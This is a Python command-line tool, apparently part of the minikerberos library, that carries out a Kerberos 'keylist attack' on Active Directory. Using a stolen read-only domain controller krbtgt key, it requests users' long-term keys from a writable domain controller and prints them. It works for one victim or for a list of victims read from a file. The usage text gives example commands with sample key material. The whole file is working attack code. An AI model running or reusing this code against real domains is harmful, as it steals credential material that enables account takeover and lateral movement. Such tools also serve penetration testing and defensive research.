import logging
import asyncio
from minikerberos.common.factory import KerberosClientFactory, kerberos_url_help_epilog
from minikerberos.common.kirbi import Kirbi
from minikerberos.protocol.asn1_structs import KERB_KEY_LIST_REP


KEYLIST_EPILOG = """
Requiremets:
    - You must obtain a valid secret key for an RODC krbtgt_##### account
    - Point the URL to a non-RODC active directory server
	- The target server in the URL specification can be IP address or FQDN
	- This attack is really sensitive on using the correct domain in the URL specification
	- The target user MUST be a user account that is explicitly allowed to be synchronized to the RODC
Example:
    python keylist.py 'kerberos+rc4://test.corp\\krbtgt_1234:921a7fece11f4d8c72432e41e40d0372@10.10.10.2' victimuser
    python keylist.py 'kerberos+aes://test.corp\\krbtgt_1234:921a7fece11f4d8c72432e41e40d0372921a7fece11f4d8c72432e41e40d0372@10.10.10.2' victimuser
"""

import enum

# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6cfc7b50-11ed-4b4d-846d-6f08f0812919
class SupportedEtypes(enum.IntFlag):
	DES_CBC_CRC = 1
	DES_CBC_MD5 = 2
	ARCFOUR_HMAC_MD5 = 4
	AES128_CTS_HMAC_SHA1_96 = 8
	AES256_CTS_HMAC_SHA1_96 = 16
	AES256_CTS_HMAC_SHA1_96_SK = 32
	FAST = 0x20000
	COMPOUND_IDENTITY =0x40000
	CLAIM_TOKEN = 0x80000
	Resource_SID_compression_disabled = 0x100000
	


async def keylistattack(kerberos_url:str, targetuser:str = None, targetrealm:str = None):
	logging.debug('Performing keylist attack')

	targetusers = []
	try:
		with open(targetuser, 'r') as f:
			targetusers = f.read().splitlines()
	except Exception as e:
		targetusers.append(targetuser)
	
	for targetuser in targetusers:
		try:
			cu = KerberosClientFactory.from_url(kerberos_url)
			client = cu.get_client()
			tgs, encTGSRepPart, key = await client.keylist(targetuser, targetrealm=targetrealm)
		except Exception as e:
			print(f'[ERR] {targetuser}: {e}')
			continue
		#kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
		#print(str(kirbi))

		print(encTGSRepPart)

		keys = {}
		if 'encrypted-pa-data' in encTGSRepPart and encTGSRepPart['encrypted-pa-data'] is not None:
			for encpadata in encTGSRepPart['encrypted-pa-data']:
				if encpadata['padata-type'] == 162:
					keylist = KERB_KEY_LIST_REP.load(encpadata['padata-value'])
					for key in keylist.native:
						if key['keytype'] not in keys:
							keys[key['keytype']] = []
						keys[key['keytype']].append(key['keyvalue'])
				elif encpadata['padata-type'] == 165:
					supported_etypes = int.from_bytes(encpadata['padata-value'], 'little', signed=False)
					print(SupportedEtypes(supported_etypes).name)
		
		if len(keys) == 0:
			print(f'[ERR] {targetuser}: No keys returned from the server')
			continue

		cred = tgs
		username = cred.get('cname')
		if username is not None:
			if len(username['name-string']) > 1:
				username = '\\'.join(username['name-string'])
			else:
				userrealm = cred.get('crealm')
				username = '%s\\%s' % (userrealm, username['name-string'][0])


		for keytype in keys:
			for keyvalue in keys[keytype]:
				print('[%s] %s: %s' % (keytype, username, keyvalue.hex()))
			print('')

def main():
	import argparse
	
	parser = argparse.ArgumentParser(description='Performs Keylist attack', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = KEYLIST_EPILOG)
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('--targetrealm', help='the realm to perform the keylist attack on')
	parser.add_argument('kerberos_url', help='the kerberos target string. ')
	parser.add_argument('targetuser', help='the user to perform the keylist attack on')
	
	
	args = parser.parse_args()
	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
	else:
		logging.basicConfig(level=1)
	
	asyncio.run(keylistattack(args.kerberos_url, args.targetuser, args.targetrealm))
	
	
if __name__ == '__main__':
	main()